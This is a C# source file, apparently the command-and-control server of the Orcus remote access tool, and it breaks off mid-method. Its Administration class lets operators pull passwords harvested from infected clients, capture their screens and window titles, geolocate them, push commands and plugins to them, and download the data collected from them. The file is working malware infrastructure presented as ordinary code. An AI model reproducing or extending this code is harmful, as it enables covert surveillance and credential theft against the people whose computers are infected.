using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using NLog;
using Orcus.Server.Core.Args;
using Orcus.Server.Core.Config;
using Orcus.Server.Core.Connection;
using Orcus.Server.Core.Database.FileSystem;
using Orcus.Server.Core.DynamicCommands;
using Orcus.Server.Core.Extensions;
using Orcus.Server.Core.Utilities;
using Orcus.Shared.Client;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.Data;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core
{
    public class Administration : IDisposable
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly object _dataDownloadLock = new object();
        private readonly DtpProcessor _dtpProcessor;
        private readonly List<int> _openClientSessions;
        private readonly object _sendLock = new object();
        private readonly ITcpServerInfo _tcpServerInfo;
        private bool _isDisposed;

        public Administration(ushort id, IConnection connection, ITcpServerInfo tcpServerInfo)
        {
            Id = id;
            Connection = connection;

            _tcpServerInfo = tcpServerInfo;

            connection.SetTimeout(0);

            _openClientSessions = new List<int>();
            _dtpProcessor = new DtpProcessor(this);
            InitializeDataTransferProtocol();
            tcpServerInfo.DynamicCommandManager.DynamicCommandAdded += DynamicCommandManagerOnDynamicCommandAdded;
            tcpServerInfo.DynamicCommandManager.DynamicCommandEventsAdded +=
                DynamicCommandManagerOnDynamicCommandEventsAdded;
            tcpServerInfo.DynamicCommandManager.DynamicCommandStatusUpdated +=
                DynamicCommandManagerOnDynamicCommandStatusUpdated;

            var activeCommandEventManagerBrake =
                new ActiveCommandEventManagerBrake(tcpServerInfo.DynamicCommandManager.ActiveCommandEventManager);
            activeCommandEventManagerBrake.PushChanges += ActiveCommandEventManagerBrakeOnPushChanges;

            new Thread(() => Read(connection.BinaryReader)) {Name = $"AI-{id}_ListeningThread", IsBackground = true}
                .Start();
        }

        public ushort Id { get; }
        public IConnection Connection { get; }

        public void Dispose()
        {
            if (_isDisposed)
                return;

            Logger.Debug("Begin disposing administration AI-{0}", Id);

            _isDisposed = true;
            _tcpServerInfo.DynamicCommandManager.DynamicCommandEventsAdded -=
                DynamicCommandManagerOnDynamicCommandEventsAdded;
            _tcpServerInfo.DynamicCommandManager.DynamicCommandAdded -= DynamicCommandManagerOnDynamicCommandAdded;
            _tcpServerInfo.DynamicCommandManager.DynamicCommandStatusUpdated -=
                DynamicCommandManagerOnDynamicCommandStatusUpdated;

            Connection.Dispose();
            Disconnected?.Invoke(this, EventArgs.Empty);
            Logger.Info("Administration AI-{0} disconnected", Id);
        }

        public event EventHandler Disconnected;
        public event EventHandler<SendPackageToClientEventArgs> SendPackageToClient;
        public event EventHandler<MultipleClientsEventArgs> RemoveClients;

        private void DynamicCommandManagerOnDynamicCommandStatusUpdated(object sender,
            DynamicCommandStatusUpdatedEventArgs dynamicCommandStatusUpdatedEventArgs)
        {
            Logger.Debug("Send dynamic command status ({0}) update of command {1} to AI-{2}",
                dynamicCommandStatusUpdatedEventArgs.Status, dynamicCommandStatusUpdatedEventArgs.DynamicCommand, Id);

            var data = new byte[5];
            Array.Copy(BitConverter.GetBytes(dynamicCommandStatusUpdatedEventArgs.DynamicCommand), data, 4);
            data[4] = (byte) dynamicCommandStatusUpdatedEventArgs.Status;

            SendPackage((byte) FromClientPackage.DynamicCommandStatusUpdate, new WriterCall(data));
        }

        private void DynamicCommandManagerOnDynamicCommandEventsAdded(object sender,
            List<DynamicCommandEvent> dynamicCommandEvents)
        {
            Logger.Debug("Send {0} dynamic command events to AI-{1}", dynamicCommandEvents.Count, Id);

            SendPackage((byte) FromClientPackage.DynamicCommandEventsAdded,
                new WriterCall(new Serializer(typeof (List<DynamicCommandEvent>)).Serialize(dynamicCommandEvents)));
        }

        private void DynamicCommandManagerOnDynamicCommandAdded(object sender,
            RegisteredDynamicCommand registeredDynamicCommand)
        {
            Logger.Debug("Send dynamic command {0} added to AI-{1}", registeredDynamicCommand.Id, Id);

            SendPackage((byte) FromClientPackage.DynamicCommandAdded,
                new WriterCall(new Serializer(RegisteredDynamicCommand.RequiredTypes).Serialize(registeredDynamicCommand)));
        }

        [DataTransferProtocolMethod]
        public PasswordData GetPasswords(int clientId)
        {
            return _tcpServerInfo.DatabaseManager.GetPasswords(clientId);
        }

        [DataTransferProtocolMethod]
        public ComputerInformation GetComputerInformation(int clientId)
        {
            return _tcpServerInfo.DatabaseManager.GetCompuerInformation(clientId);
        }

        [DataTransferProtocolMethod]
        public List<ExceptionInfo> GetExceptions(DateTime from, DateTime to)
        {
            return _tcpServerInfo.DatabaseManager.GetExceptions(from, to);
        }

        [DataTransferProtocolMethod]
        public List<ClientLocation> GetClientLocations()
        {
            var clients = _tcpServerInfo.DatabaseManager.GetAllClientIds();
            var result = new List<ClientLocation>();
            foreach (var client in _tcpServerInfo.Clients.ToList())
            {
                if (client.Value.LocationInfo == null)
                    continue;

                result.Add(new ClientLocation
                {
                    ClientId = client.Key,
                    IpAddress = client.Value.Ip,
                    City = client.Value.LocationInfo.City,
                    Country = client.Value.LocationInfo.Country,
                    CountryName = client.Value.LocationInfo.CountryName,
                    Latitude = client.Value.LocationInfo.Latitude,
                    Longitude = client.Value.LocationInfo.Longitude,
                    Region = client.Value.LocationInfo.Region,
                    ZipCode = client.Value.LocationInfo.ZipCode,
                    Timezone = client.Value.LocationInfo.Timezone
                });
                clients.Remove(client.Key);
            }
            result.AddRange(_tcpServerInfo.DatabaseManager.GetClientLocations(clients));

            return result;
        }

        [DataTransferProtocolMethod]
        public Statistics GetStatistics()
        {
            var statistics = _tcpServerInfo.DatabaseManager.GetStatistics(_tcpServerInfo.Clients);
            statistics.UsedMemory = GC.GetTotalMemory(false);
            statistics.UpSince = _tcpServerInfo.OnlineSince;
            return statistics;
        }

        [DataTransferProtocolMethod]
        public LightInformation GetAllClientsLight()
        {
            var result = new LightInformation
            {
                Groups = new List<string>(),
                OperatingSystems = new List<string>(),
                Clients = new List<LightClientInformation>()
            };

            var clients = _tcpServerInfo.DatabaseManager.GetAllClients().ToList();
            short id = 0;
            foreach (var group in clients.GroupBy(x => x.Group))
            {
                result.Groups.Add(group.Key);
                foreach (var client in group)
                {
                    var lightClient = new LightClientInformation
                    {
                        GroupId = id,
                        Id = client.Id,
                        UserName = client.UserName,
                        OsType = client.OsType,
                        Language = client.Language,
                        LocatedCountry = client.LocatedCountry
                    };

                    if (result.OperatingSystems.Contains(client.OsName))
                        lightClient.OsNameId = (short)result.OperatingSystems.IndexOf(client.OsName);
                    else
                    {
                        lightClient.OsNameId = (short)result.OperatingSystems.Count;
                        result.OperatingSystems.Add(client.OsName);
                    }

                    if (_tcpServerInfo.Clients.ContainsKey(client.Id))
                    {
                        var onlineClient = _tcpServerInfo.Clients[client.Id].GetOnlineClientInformation();
                        lightClient.ApiVersion = onlineClient.ApiVersion;
                        lightClient.IsServiceRunning = onlineClient.IsServiceRunning;
                        lightClient.IsAdministrator = onlineClient.IsAdministrator;
                        lightClient.IsOnline = true;
                    }

                    result.Clients.Add(lightClient);
                }

                id++;
            }

            return result;
        }

        [DataTransferProtocolMethod]
        public LightInformationApp GetAllClientsLightApp()
        {
            var result = new LightInformationApp
            {
                Groups = new List<string>(),
                OperatingSystems = new List<string>(),
                Clients = new List<LightClientInformationApp>()
            };

            var groups = _tcpServerInfo.Clients.GroupBy(x => x.Value.Data.Group);
            short id = 0;
            foreach (var group in groups)
            {
                result.Groups.Add(group.Key);
                result.Clients.AddRange(
                    group.Select(
                        x =>
                            new LightClientInformationApp
                            {
                                ApiVersion = (short)x.Value.ComputerInformation.ApiVersion,
                                GroupId = id,
                                Id = x.Value.Id,
                                UserName = x.Value.Data.UserName,
                                IsServiceRunning = x.Value.ComputerInformation.IsServiceRunning,
                                IsAdministrator = x.Value.ComputerInformation.IsAdministrator,
                                IpAddress = x.Value.Ip,
                                OsType = x.Value.Data.OSType,
                                Language = x.Value.ComputerInformation.Language,
                                OsNameId =
                                    result.OperatingSystems.Contains(x.Value.Data.Group)
                                        ? (short)result.OperatingSystems.IndexOf(x.Value.Data.Group)
                                        : (short)result.OperatingSystems.AddEx(x.Value.Data.Group),
                                OnlineSince = x.Value.OnlineSince,
                                LocatedCountry = x.Value.LocationInfo?.Country
                            }));
                id++;
            }

            return result;
        }

        [DataTransferProtocolMethod(typeof(OnlineClientInformation), typeof(OfflineClientInformation))]
        public List<ClientInformation> GetClientDetails(List<int> clientIds)
        {
            var clients = _tcpServerInfo.DatabaseManager.GetClientInformation(clientIds);
            for (int i = 0; i < clients.Count; i++)
            {
                var client = clients[i];
                if (_tcpServerInfo.Clients.ContainsKey(client.Id))
                {
                    clients[i] = _tcpServerInfo.Clients[client.Id].GetOnlineClientInformation();
                    clients[i].IsPasswordDataAvailable = client.IsPasswordDataAvailable;
                }
            }

            return clients;
        }

        [DataTransferProtocolMethod]
        public void ChangeGroup(List<int> clients, string newGroupName)
        {
            if (newGroupName.Length < 256)
                _tcpServerInfo.ChangeGroup(clients, newGroupName);
        }

        [DataTransferProtocolMethod(MethodName = "RemoveClients")]
        public void RemoveClientsProcedure(List<int> clients)
        {
            RemoveClients?.Invoke(this, new MultipleClientsEventArgs(clients));
        }

        [DataTransferProtocolMethod]
        public void RemoveDynamicCommands(List<int> dynamicCommands)
        {
            foreach (var dynamicCommand in dynamicCommands)
            {
                var command =
                    _tcpServerInfo.DynamicCommandManager.GetDynamicCommandById(dynamicCommand);
                if (command != null)
                    _tcpServerInfo.DynamicCommandManager.RemoveDynamicCommand(command);
                else
                    _tcpServerInfo.DatabaseManager.RemoveDynamicCommand(dynamicCommand);
                //commands which are done don't get loaded
            }

            var package = new Serializer(typeof(List<int>)).Serialize(dynamicCommands);
            foreach (var administration in _tcpServerInfo.Administrations)
                administration.Value.SendPackage((byte) FromClientPackage.DynamicCommandsRemoved,
                    new WriterCall(package));
        }

        [DataTransferProtocolMethod]
        public void StopDynamicCommands(List<int> dynamicCommands)
        {
            foreach (var dynamicCommand in dynamicCommands)
            {
                var command =
                    _tcpServerInfo.DynamicCommandManager.GetActiveCommandById(dynamicCommand);
                if (command != null)
                    _tcpServerInfo.DynamicCommandManager.StopActiveCommand(command);
            }
        }

        [DataTransferProtocolMethod]
        public void StopClientActiveCommands(List<int> clients, int dynamicCommandId)
        {
            var activeCommand = _tcpServerInfo.DynamicCommandManager.GetActiveCommandById(dynamicCommandId);
            if (activeCommand == null)
                return;

            foreach (var clientId in clients)
            {
                Client client;
                if (_tcpServerInfo.Clients.TryGetValue(clientId, out client))
                    client.StopActiveCommand(dynamicCommandId);
            }
        }

        [DataTransferProtocolMethod]
        public void GetClientActiveWindowTitle(List<int> clients)
        {
            foreach (var clientId in clients)
            {
                Client client;
                if (_tcpServerInfo.Clients.TryGetValue(clientId, out client))
                    client.SendPackage((byte)FromAdministrationPackage.GetActiveWindow,
                        new WriterCall(BitConverter.GetBytes(Id)));
            }
        }

        [DataTransferProtocolMethod]
        public void GetClientScreen(List<int> clients)
        {
            foreach (var clientId in clients)
            {
                Client client;
                if (_tcpServerInfo.Clients.TryGetValue(clientId, out client))
                    client.SendPackage((byte)FromAdministrationPackage.GetScreen,
                        new WriterCall(BitConverter.GetBytes(Id)));
            }
        }

        [DataTransferProtocolMethod]
        public List<DataEntry> GetDataEntries()
        {
            return _tcpServerInfo.DatabaseManager.GetDataEntries(
                bool.Parse(GlobalConfig.Current.IniFile.GetKeyValue("DATA_MANAGER", "CheckFileExists")));
        }

        [DataTransferProtocolMethod]
        public byte[] DownloadData(int dataId)
        {
            var path = _tcpServerInfo.DatabaseManager.GetDataEntryFileName(dataId);
            return !string.IsNullOrEmpty(path) && File.Exists(path) ? File.ReadAllBytes(path) : null;
        }

        [DataTransferProtocolMethod]
        public List<byte[]> DownloadMultipleData(List<int> dataIds)
        {
            var result = new List<byte[]>();
            foreach (var dataId in dataIds)
            {
                var path = _tcpServerInfo.DatabaseManager.GetDataEntryFileName(dataId);
                result.Add(!string.IsNullOrEmpty(path) && File.Exists(path) ? File.ReadAllBytes(path) : null);
            }
            return result;
        }

        [DataTransferProtocolMethod]
        public void RemoveDataEntries(List<int> removedDataIds)
        {
            _tcpServerInfo.DatabaseManager.RemoveDataEntries(removedDataIds);

            var writerCall = new WriterCall(new Serializer(typeof(List<int>)).Serialize(removedDataIds));
            foreach (var administration in _tcpServerInfo.Administrations)
                administration.Value.SendPackage((byte)FromClientPackage.DataRemoved, writerCall);
        }

        [DataTransferProtocolMethod]
        public byte[] DownloadDataEntry(int dataEntryId)
        {
            var fileName = _tcpServerInfo.DatabaseManager.GetDataEntryFileName(dataEntryId);
            var fs = new FileStream(fileName, FileMode.Open, FileAccess.Read);
            byte[] hash;
            using (var sha256 = new SHA256Managed())
                hash = sha256.ComputeHash(fs);
            fs.Position = 0;
            new Thread(() =>
                {
                    try
                    {
                        var buffer =
                            new byte[
                                int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("DATA_MANAGER", "DownloadDataBuffer"))
                                ];
                        lock (_dataDownloadLock)
                        {
                            int read;
                            while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                lock (_sendLock)
                                {
                                    Connection.BinaryWriter.Write((byte) FromClientPackage.DataDownloadPackage);
                                    Connection.BinaryWriter.Write(read);
                                    Connection.BinaryWriter.Write(buffer, 0, read);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Error("Error when sending file packages to AI-{0} (DataID: {1}): {2}", Id, dataEntryId,
                            ex.Message);
                    }
                    finally
                    {
                        fs.Dispose();
                    }
                })
                {Name = $"AI-{Id}_DownloadDataEntryThread", IsBackground = true}.Start();
            return hash;
        }

        [DataTransferProtocolMethod]
        public void RemovePasswordsOfClients(List<int> clients)
        {
            _tcpServerInfo.DatabaseManager.RemovePasswords(clients);

            var writerCall = new WriterCall(new Serializer(typeof(List<int>)).Serialize(clients));
            foreach (var administration in _tcpServerInfo.Administrations)
                administration.Value.SendPackage((byte) FromClientPackage.PasswordsRemoved, writerCall);
        }

        [DataTransferProtocolMethod]
        public LocationInfo GetClientLocation(int clientId)
        {
#pragma warning disable IDE0004
            //the cast is really important because the object gets serialized
            return (LocationInfo)
                _tcpServerInfo.DatabaseManager.GetClientLocations(new List<int> {clientId})
                    .FirstOrDefault();
#pragma warning restore IDE0004
        }

        [DataTransferProtocolMethod]
        public bool IsStaticCommandPluginAvailable(byte[] hash)
        {
            int garcon;
            return _tcpServerInfo.DatabaseManager.CheckIsStaticCommandPluginAvailable(hash, out garcon);
        }

        [DataTransferProtocolMethod]
        public int GetStaticCommandPluginResourceId(byte[] pluginHash)
        {
            int pluginId;
            _tcpServerInfo.DatabaseManager.CheckIsStaticCommandPluginAvailable(pluginHash, out pluginId);
            return pluginId;
        }

        private void InitializeDataTransferProtocol()
        {
            _dtpProcessor.RegisterFunction("GetDynamicCommands",
                parameters => _tcpServerInfo.DynamicCommandManager.GetDynamicCommands(),
                DynamicCommandInfo.RequiredTypes);
            _dtpProcessor.RegisterFunction("GetClientConfig", parameters =>
            {
                Client client;
                return _tcpServerInfo.Clients.TryGetValue(parameters.GetInt32(0), out client)
                    ? client.ComputerInformation.ClientConfig
                    : null;
            }, BuilderPropertyHelper.GetAllBuilderPropertyTypes().AddItem(typeof (ClientConfig)).ToArray());

            _dtpProcessor.ExceptionOccurred +=
                (sender, args) => Logger.Error(args.Exception, "Exception occurred in Data Transfer Protocol Processor");
        }

        private void ReportError(Exception ex, string methodName)
        {
            if (ex is ObjectDisposedException)
            {
                Logger.Debug(ex, "Exception occurred in method {0}; Just dispose", methodName);
                Dispose();
            }
            else
                Logger.Error(ex, "Error when sending data to the administration AI-{0} ({1})", Id, methodName);
        }

        public void SendPackage(byte command, WriterCall writerCall)
        {
            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write(command);
                    Connection.BinaryWriter.Write(writerCall.Size);
                    writerCall.WriteIntoStream(Connection.BaseStream);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyPluginAvailable(Client client, PluginInfo pluginInfo)
        {
            Logger.Debug("Notify AI-{0} that the client CI-{1} loaded the plugin {2:D} successfully", Id, client.Id, pluginInfo.Guid);

            try
            {
                var data = new Serializer(typeof (PluginInfo)).Serialize(pluginInfo);
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.PluginLoaded);
                    Connection.BinaryWriter.Write(data.Length + 4);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
                    Connection.BinaryWriter.Write(data);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyNewClient(Client client)
        {
            Logger.Debug("Notify AI-{0} that the new client CI-{1} connected", Id, client.Id);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.NewClientConnected);
                    var serializer = new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)});
                    var bytes = serializer.Serialize(client.GetOnlineClientInformation());
                    Connection.BinaryWriter.Write(bytes.Length);
                    Connection.BinaryWriter.Write(bytes);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyClientConnected(Client client)
        {
            Logger.Debug("Notify AI-{0} that the client CI-{1} connected", Id, client.Id);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ClientConnected);
                    var serializer = new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)});
                    var bytes = serializer.Serialize(client.GetOnlineClientInformation());
                    Connection.BinaryWriter.Write(bytes.Length);
                    Connection.BinaryWriter.Write(bytes);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyClientDisconnected(Client client)
        {
            Logger.Debug("Notify AI-{0} that the client CI-{1} disconnected", Id, client.Id);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ClientDisconnected);
                    Connection.BinaryWriter.Write(4);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyComputerInformationAvailable(Client client)
        {
            Logger.Debug("Notify AI-{0} that computer information are available on client CI-{1}", Id, client.Id);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ComputerInformationAvailable);
                    Connection.BinaryWriter.Write(4);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyPasswordsAvailable(Client client)
        {
            Logger.Debug("Notify AI-{0} that passwords are available on client CI-{1}", Id, client.Id);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.PasswordsAvailable);
                    Connection.BinaryWriter.Write(4);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyGroupChanged(List<int> clients, string name)
        {
            Logger.Debug("Notify AI-{0} group name of {1} clients changed to {2}", Id, clients.Count, name);

            try
            {
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.GroupChanged);
                    var nameBytes = Encoding.UTF8.GetBytes(name);
                    var clientsData = new Serializer(typeof (List<int>)).Serialize(clients);
                    Connection.BinaryWriter.Write(clientsData.Length + nameBytes.Length + 4);
                    Connection.BinaryWriter.Write(nameBytes.Length);
                    Connection.BinaryWriter.Write(nameBytes);
                    Connection.BinaryWriter.Write(clientsData);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void NotifyClientsRemoved(List<int> clients)
        {
            try
            {
                var serializer = new Serializer(typeof (List<int>));
                var data = serializer.Serialize(clients);
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ClientsRemoved);
                    Connection.BinaryWriter.Write(data.Length);
                    Connection.BinaryWriter.Write(data);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void SendPasswords(PasswordData passwordData)
        {
            try
            {
                var data = new Serializer(typeof (PasswordData)).Serialize(passwordData);
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ResponseToAdministration);
                    Connection.BinaryWriter.Write(data.Length + 5);
                    Connection.BinaryWriter.Write((byte) ResponseType.CommandResponse);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(12)); //Password Command ID
                    Connection.BinaryWriter.Write(data);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void SendComputerInformation(ComputerInformation computerInformation)
        {
            try
            {
                var data = new Serializer(typeof (ComputerInformation)).Serialize(computerInformation);
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.ResponseToAdministration);
                    Connection.BinaryWriter.Write(data.Length + 6);
                    Connection.BinaryWriter.Write((byte) ResponseType.CommandResponse);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(4)); //Computer Information ID
                    Connection.BinaryWriter.Write((byte) CommandResponse.Successful);
                    Connection.BinaryWriter.Write(data);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        private void DynamicCommandReceived(DynamicCommand dynamicCommand)
        {
            _tcpServerInfo.DynamicCommandManager.AddDynamicCommand(dynamicCommand);
        }

        private void ReceiveStaticCommandPlugin(BinaryReader binaryReader, int size)
        {
            var hash = binaryReader.ReadBytes(16);
            string filename;
            var dataEntry = DataSystem.GetFreeGuid(out filename);
            Logger.Info("Receiving static command plugin ({0} B, {1})", size - 16, StringExtensions.BytesToHex(hash));

            byte[] fileHash;
            using (var fileStream = new FileStream(filename, FileMode.CreateNew, FileAccess.ReadWrite))
            {
                var buffer = new byte[8192];
                int sizeLeft = size - 16;
                while (sizeLeft > 0)
                {
                    var packageSize = sizeLeft > 8192 ? 8192 : sizeLeft;
                    var read = binaryReader.Read(buffer, 0, packageSize);
                    fileStream.Write(buffer, 0, read);
                    sizeLeft -= read;
                }

                fileStream.Position = 0;
                using (var md5 = new MD5CryptoServiceProvider())
                    fileHash = md5.ComputeHash(fileStream);
            }

            if (fileHash.SequenceEqual(hash))
            {
                _tcpServerInfo.DatabaseManager.AddStaticCommandPlugin(dataEntry, fileHash);
                Logger.Info("Static command was successfully added to the database ({0})",
                    StringExtensions.BytesToHex(hash));
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.StaticCommandPluginReceived);
                    Connection.BinaryWriter.Write(16);
                    Connection.BinaryWriter.Write(fileHash);
                }
            }
            else
            {
                Logger.Error("File hashes do not match. Removing all temporary files. Failed plugin {0}",
                    StringExtensions.BytesToHex(hash));
                File.Delete(filename);

                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte) FromClientPackage.StaticCommandPluginTransmissionFailed);
                    Connection.BinaryWriter.Write(16);
                    Connection.BinaryWriter.Write(fileHash);
                }
            }
        }

        private void ActiveCommandEventManagerBrakeOnPushChanges(object sender,
            List<ActiveCommandEvent> activeCommandEvents)
        {
            if (_isDisposed)
                return;

            var activeCommandsUpdate = new ActiveCommandsUpdate
            {
                CommandsDeactivated =
                    activeCommandEvents.Where(x => x.ActiveCommandEventType == ActiveCommandEventType.Removed)
                        .Select(
                            x =>
                                new CommandStatusInfo
                                {
                                    CommandId = x.ActiveCommandInfo.DynamicCommand.Id,
                                    Status =
                                        x.ActiveCommandInfo.DynamicCommand.Status != DynamicCommandStatus.Active
                                            ? x.ActiveCommandInfo.DynamicCommand.Status
                                            : DynamicCommandStatus.Done
                                })
                        .ToList(),
                UpdatedCommands =
                    activeCommandEvents.Where(x => x.ActiveCommandEventType != ActiveCommandEventType.Removed).Select(
                        x =>
                        {
                            lock (x.ActiveCommandInfo.ClientsLock)
                                return new ActiveCommandUpdateInfo
                                {
                                    CommandId = x.ActiveCommandInfo.DynamicCommand.Id,
                                    Clients = x.ActiveCommandInfo.Clients.Select(y => y.Id).ToList()
                                };
                        }).ToList()
            };

            var serializer = new Serializer(typeof(ActiveCommandsUpdate));
            var data = serializer.Serialize(activeCommandsUpdate);

            try
            {
                Logger.Debug(
                    "Send active commands changed package to AI-{0} with {1} deactivated commands and {2} updated commands",
                    Id, activeCommandsUpdate.CommandsDeactivated.Count, activeCommandsUpdate.UpdatedCommands.Count);
                lock (_sendLock)
                {
                    Connection.BinaryWriter.Write((byte)FromClientPackage.ActiveCommandsChanged);
                    Connection.BinaryWriter.Write(data.Length);
                    Connection.BinaryWriter.Write(data);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, MethodBase.GetCurrentMethod().Name);
            }
        }

        public void ClientRedirect(BinaryReader binaryReader, int size)
        {
            var clientId = binaryReader.ReadInt32();
            var clientRedirectOptions = (ClientRedirectOptions) binaryReader.ReadInt32();
            var client = _tcpServerInfo.Clients[clientId];
            var packageId = binaryReader.ReadByte();

            Logger.Debug("Administration AI-{0} opens a client redirect to client CI-{1} B with package id {2} and the redirect options {3}", Id, clientId,
                packageId, clientRedirectOptions);

            if (
                (clientRedirectOptions & ClientRedirectOptions.IncludeAdministrationId) ==
                ClientRedirectOptions.IncludeAdministrationId)
                size += 2;

            client.SendPackage(packageId, new WriterCall(size, writer =>
            {
                if (
                    (clientRedirectOptions & ClientRedirectOptions.IncludeAdministrationId) ==
                    ClientRedirectOptions.IncludeAdministrationId)
                {
                    writer.Write(Id);
                    size -= 2;
                }

                var buffer = new byte[8192];
                int read;
                while (size > 0 && (read = binaryReader.Read(buffer, 0, Math.Min(buffer.Length, size))) > 0)
                {
                    writer.Write(buffer, 0, read);
                    size -= read;
                }
            }));
        }

        private void Read(BinaryReader binaryReader)
        {
            Logger.Debug("Begin reading data from stream of administration AI-{0}", Id);

            try
            {
                while (true)
                {
                    var parameter = binaryReader.ReadByte();
                    var size = Connection.BinaryReader.ReadInt32();

                    var bytes = new Lazy<byte[]>(() => Connection.BinaryReader.ReadBytes(size));
                    int clientId;
                    switch ((FromAdministrationPackage) parameter)
                    {
                        case FromAdministrationPackage.InitializeNewSession:
                            clientId = BitConverter.ToInt32(bytes.Value, 0);
                            SendPackageToClient?.Invoke(this,
                                new SendPackageToClientEventArgs(clientId,
                                    (byte) FromAdministrationPackage.InitializeNewSession,
                                    new WriterCall(2, writer => writer.Write(Id))));
                            _openClientSessions.Add(clientId);
                            Logger.Info("Administration AI-{0} initializes session with client CI-{1}", Id, clientId);
                            break;
                        case FromAdministrationPackage.CloseSession:
                            clientId = BitConverter.ToInt32(bytes.Value, 0);
                            _openClientSessions.Remove(clientId);
                            SendPackageToClient?.Invoke(this,
                                new SendPackageToClientEventArgs(clientId, (byte) FromAdministrationPackage.CloseSession,
                                    new WriterCall(2, writer => writer.Write(Id))));
                            Logger.Info("Administration AI-{0} closed session with client CI-{1}", Id, clientId);
                            break;
                        case FromAdministrationPackage.SendCommandCompressed:
                        case FromAdministrationPackage.SendCommand:
                            clientId = BitConverter.ToInt32(bytes.Value, 0);
                            Logger.Debug("Administration AI-{0} sends command to client CI-{1}", Id, clientId);

                            SendPackageToClient?.Invoke(this,
                                new SendPackageToClientEventArgs(clientId, parameter,
                                    new WriterCall(bytes.Value.Length - 2,
                                        writer =>
                                        {
                                            writer.Write(Id);
                                            writer.Write(bytes.Value, 4, bytes.Value.Length - 4);
                                        })));
                            break;
                        case FromAdministrationPackage.SendDynamicCommand:
                            DynamicCommandReceived(
                                new Serializer(DynamicCommandInfo.RequiredTypes).Deserialize<DynamicCommand>(
                                    bytes.Value, 0));
                            break;
                        case FromAdministrationPackage.SendDynamicCommandCompressed:
                            DynamicCommandReceived(
                                new Serializer(DynamicCommandInfo.RequiredTypes).Deserialize<DynamicCommand>(
                                    LZF.Decompress(bytes.Value, 0)));
                            break;
                        case FromAdministrationPackage.LoadPlugin:
                            clientId = BitConverter.ToInt32(bytes.Value, 0);
                            Logger.Debug("Administration AI-{0} requests plugin loading on client CI-{1}", Id, clientId);

                            SendPackageToClient?.Invoke(this,
                                new SendPackageToClientEventArgs(clientId, parameter,
                                    new WriterCall(bytes.Value.Length - 2,
                                        writer =>
                                        {
                                            writer.Write(Id);
                                            writer.Write(bytes.Value, 4, bytes.Value.Length - 4);
                                        })));
                            break;
                        case FromAdministrationPackage.DataTransferProtocol:
                            Logger.Debug("Data Transfer Protocol package received");
                            var result = _dtpProcessor.Receive(bytes.Value);
                            Logger.Debug("Data Transfer Protocol package processed");
                            lock (_sendLock)
                            {
                                Connection.BinaryWriter.Write((byte) FromClientPackage.DataTransferProtocolResponse);
                                Connection.BinaryWriter.Write(result.Length);
                                Connection.BinaryWriter.Write(result);
                            }
                            break;
                        case FromAdministrationPackage.SendStaticCommandPlugin:
                            Logger.Debug("Send dynamic command plugin with size {0} B", size);
                            ReceiveStaticCommandPlugin(binaryReader, size);
                            break;
                        case FromAdministrationPackage.ClientRedirect:
                            ClientRedirect(binaryReader, size);
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
